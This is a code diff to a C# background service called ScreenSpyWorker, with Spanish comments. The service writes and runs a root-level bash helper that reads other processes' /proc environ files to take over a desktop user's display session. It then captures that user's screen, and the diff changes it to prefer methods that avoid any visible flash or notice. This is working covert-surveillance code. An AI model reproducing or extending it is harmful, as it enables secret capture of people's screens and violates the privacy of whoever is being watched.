@@ -123,32 +123,26 @@ public class ScreenSpyWorker : BackgroundService
         {
             _logger.LogInformation($"📷 [SPY] Capturando pantalla a {tempFile}...");
             
-            // Crear script de captura robusto
+            // Crear script de captura robusto (SIEMPRE SOBREESCRIBIR)
             string scriptPath = "/tmp/capture_helper.sh";
-            if (!File.Exists(scriptPath))
-            {
-                string scriptContent = @"#!/bin/bash
+            string scriptContent = @"#!/bin/bash
 OUTPUT=$1
 
 # Función para buscar variables en procesos del usuario
 function find_session_vars() {
-    # Buscar procesos de interfaz gráfica (gnome-shell, Xorg, kwin, etc)
+    # Buscar procesos de interfaz gráfica
     for pid in $(pgrep -u $1 'gnome-shell|Xorg|kwin|xfwm4|lxsession'); do
-        # Intentar leer el environment del proceso
         if [ -f /proc/$pid/environ ]; then
-            # Leer environ reemplazando nulls por newlines
             ENV_CONTENT=$(cat /proc/$pid/environ | tr '\0' '\n')
-            
-            # Extraer variables fundamentales
             DISP=$(echo ""$ENV_CONTENT"" | grep '^DISPLAY=' | cut -d= -f2-)
             WDISP=$(echo ""$ENV_CONTENT"" | grep '^WAYLAND_DISPLAY=' | cut -d= -f2-)
             XAUTH=$(echo ""$ENV_CONTENT"" | grep '^XAUTHORITY=' | cut -d= -f2-)
             DBUS=$(echo ""$ENV_CONTENT"" | grep '^DBUS_SESSION_BUS_ADDRESS=' | cut -d= -f2-)
             RUNDIR=$(echo ""$ENV_CONTENT"" | grep '^XDG_RUNTIME_DIR=' | cut -d= -f2-)
             
-            # Fallback para XAUTH si está vacío
-            if [ -z ""$XAUTH"" ]; then
-                [ -f ""/home/$1/.Xauthority"" ] && XAUTH=""/home/$1/.Xauthority""
+            # Fallback corregido para XAUTH
+            if [ -z ""$XAUTH"" ] && [ -f ""/home/$1/.Xauthority"" ]; then
+                XAUTH=""/home/$1/.Xauthority""
             fi
 
             if [ -n ""$DISP"" ] || [ -n ""$WDISP"" ]; then
@@ -171,21 +165,15 @@ for uid_dir in /run/user/[0-9]*; do
     user_name=$(id -nu $uid 2>/dev/null)
     if [ -n ""$user_name"" ] && [ ""$user_name"" != ""messagebus"" ] && [ ""$user_name"" != ""root"" ]; then
         REAL_USER=$user_name
-        find_session_vars $REAL_USER
-        if [ -n ""$DISPLAY"" ] || [ -n ""$WAYLAND_DISPLAY"" ]; then
-            break 
-        fi
+        find_session_vars $REAL_USER && break
     fi
 done
 
-echo ""INFO:USER=$REAL_USER""
-echo ""INFO:DISPLAY=$DISPLAY""
-echo ""INFO:WAYLAND=$WAYLAND_DISPLAY""
-echo ""INFO:XAUTH=$XAUTHORITY""
+echo ""INFO:USER=$REAL_USER DISPLAY=$DISPLAY WAYLAND=$WAYLAND_DISPLAY XAUTH=$XAUTHORITY""
 
-# 3. Intentar capturar (ESTO ES LO CLAVE: sudo -u $REAL_USER)
+# 3. Intentar capturar (Priorizando Silencio y Wayland)
 
-# Opción A: D-Bus GNOME (Intento silencioso)
+# Opción A: D-Bus GNOME (Silent)
 if [ -n ""$DBUS_SESSION_BUS_ADDRESS"" ]; then
     sudo -u $REAL_USER env DISPLAY=$DISPLAY WAYLAND_DISPLAY=$WAYLAND_DISPLAY \
     XDG_RUNTIME_DIR=$XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS \
@@ -194,22 +182,22 @@ if [ -n ""$DBUS_SESSION_BUS_ADDRESS"" ]; then
     if [ -s ""$OUTPUT"" ]; then echo ""METHOD:gnome-dbus-silent"" && exit 0; fi
 fi
 
-# Opción B: import (ImageMagick X11/XWayland - Silencioso)
-sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
-import -window root ""$OUTPUT"" >/dev/null 2>&1
-if [ -s ""$OUTPUT"" ]; then echo ""METHOD:import-silent"" && exit 0; fi
-
-# Opción C: scrot (X11 - Silencioso)
-sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
-scrot -z -o ""$OUTPUT"" >/dev/null 2>&1
-if [ -s ""$OUTPUT"" ]; then echo ""METHOD:scrot-silent"" && exit 0; fi
-
-# Opción D: grim (Wayland Puro - Silencioso)
-if command -v grim >/dev/null; then
+# Opción B: grim (Wayland Puro - Silencioso) - ALTA PRIORIDAD EN 24.04
+if command -v grim >/dev/null && [ -n ""$WAYLAND_DISPLAY"" ]; then
     sudo -u $REAL_USER env WAYLAND_DISPLAY=$WAYLAND_DISPLAY XDG_RUNTIME_DIR=$XDG_RUNTIME_DIR \
     grim ""$OUTPUT"" >/dev/null 2>&1
     if [ -s ""$OUTPUT"" ]; then echo ""METHOD:grim-silent"" && exit 0; fi
 fi
+
+# Opción C: import (ImageMagick - Silencioso)
+sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
+import -window root ""$OUTPUT"" >/dev/null 2>&1
+if [ -s ""$OUTPUT"" ]; then echo ""METHOD:import-silent"" && exit 0; fi
+
+# Opción D: scrot (Silencioso)
+sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
+scrot -z -o ""$OUTPUT"" >/dev/null 2>&1
+if [ -s ""$OUTPUT"" ]; then echo ""METHOD:scrot-silent"" && exit 0; fi
 
 # Opción E: gnome-screenshot (X11/Wayland - TIENE FLASH - Último recurso)
 sudo -u $REAL_USER env DISPLAY=$DISPLAY WAYLAND_DISPLAY=$WAYLAND_DISPLAY \
@@ -219,11 +207,8 @@ if [ -s ""$OUTPUT"" ]; then echo ""METHOD:gnome-screenshot-flash"" && exit 0; fi
 
 exit 1
 ";
-                await File.WriteAllTextAsync(scriptPath, scriptContent);
-                // Dar permisos de ejecución
-                var chmod = new ProcessStartInfo { FileName = "chmod", Arguments = $"+x {scriptPath}" };
-                Process.Start(chmod)?.WaitForExit();
-            }
+            await File.WriteAllTextAsync(scriptPath, scriptContent);
+            Process.Start("chmod", $"+x {scriptPath}")?.WaitForExit();
 
             // Ejecutar el script helper
             var psiCapture = new ProcessStartInfo
